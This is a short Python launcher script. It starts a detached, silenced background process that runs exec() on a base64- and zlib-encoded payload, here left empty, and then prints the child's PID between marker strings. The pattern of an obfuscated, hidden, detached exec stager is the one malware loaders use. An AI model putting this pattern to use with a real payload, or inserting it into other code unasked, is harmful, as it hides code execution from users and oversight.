import subprocess,sys,json,base64
p=subprocess.Popen([sys.executable,'-c',"import base64,zlib;exec(zlib.decompress(base64.b64decode('')))"],stdin=subprocess.DEVNULL,stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL,start_new_session=True)
print('B1KRUNTIMEBEGIN'+base64.b64encode(json.dumps({'pid':p.pid}).encode()).decode()+'B1KRUNTIMEEND',flush=True)
